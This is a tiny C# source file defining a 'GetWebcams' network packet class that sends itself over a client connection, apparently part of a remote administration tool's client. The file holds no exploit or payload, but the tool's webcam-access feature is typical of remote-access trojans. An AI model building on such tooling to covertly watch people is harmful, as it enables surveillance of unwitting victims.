using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcams : IPacket
    {
        public GetWebcams()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}